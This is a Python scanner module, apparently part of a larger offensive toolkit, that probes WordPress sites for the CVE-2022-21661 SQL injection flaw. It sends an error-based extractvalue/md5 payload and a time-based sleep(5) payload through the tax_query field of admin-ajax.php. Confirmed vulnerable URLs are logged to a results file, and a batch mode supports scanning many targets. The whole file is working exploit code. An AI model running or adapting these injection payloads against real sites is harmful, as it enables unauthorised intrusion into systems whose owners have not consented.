#!/user/bin/env python3
# -*- coding: utf-8 -*-
import requests, hashlib, random,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
urllib3.disable_warnings()

class Cve_2022_21661:
    def main(self,target):
        self.batch = target["batch_work"]
        url=target["url"].strip("/ ")
        headers = target["header"]
        proxy = target["proxy"]
        ssl = target["ssl"]
        timeout = int(target["timeout"])


        _, self.proxy = ReqSet(proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo('WordPress','Attempting to locate CVE-2022-21661...')
        try:
            r0 = requests.get(f'{url}/wp-admin/admin-ajax.php', headers={"User-Agent": headers},proxies=self.proxy,timeout=timeout,verify=ssl)
            if r0.status_code == 400 and '0' in r0.text:
                randNum = str(random.randint(1234567890987654321,9999999999999999999)).encode('utf-8')
                data='{"tax_query":{"0":{"field":"term_taxonomy_id","terms":["111) and extractvalue(rand(),concat(0x5e,md5(' + str(randNum) + '),0x5e))#"]}}}'
                r1 = requests.post(f'{url}/wp-admin/admin-ajax.php', data={"action":"test","data":data}, headers={"User-Agent": headers},proxies=self.proxy,timeout=timeout,verify=ssl)
                if r1.status_code == 200 and str(hashlib.md5(randNum).hexdigest()) in r1.text:
                    OutPrintInfoSuc('WordPress',f'Vulnerable URL: {url} ')
                    if self.batch:
                        with open("./result/wordpress_2022_21661.txt", "a") as w:
                            w.write(f"{url}/wp-admin/admin-ajax.php\n")
                else:
                    if not self.batch:
                        OutPrintInfo('WordPress','Failed on MD5, testing time based query...')
                    data = '{"tax_query":{"0":{"field":"term_taxonomy_id","terms":["111) or (select sleep(5))#"]}}}'
                    r2 = requests.post(f'{url}/wp-admin/admin-ajax.php', data={"action":"test","data":data}, headers={"User-Agent": headers},proxies=self.proxy,timeout=timeout,verify=ssl)
                    if r2.elapsed.total_seconds() >= 5 and r2.status_code == 200:
                        OutPrintInfoSuc('WordPress',f'Vulnerable URL: {url} ')
                        if self.batch:
                            with open("./result/wordpress_2022_21661.txt","a") as w:
                                w.write(f"{url}/wp-admin/admin-ajax.php\n")
                    else:
                        if not self.batch:
                            OutPrintInfo('WordPress','Not Vulnerable! (Failed after checking for CVE using 2 PoC\'s)')
            else:
                if not self.batch:
                    OutPrintInfo('WordPress','Not Vulnerable! (Failed at admin-ajax check)')
        except Exception as e:
            if not self.batch:
                OutPrintInfo('WordPress', 'Not Vulnerable!')
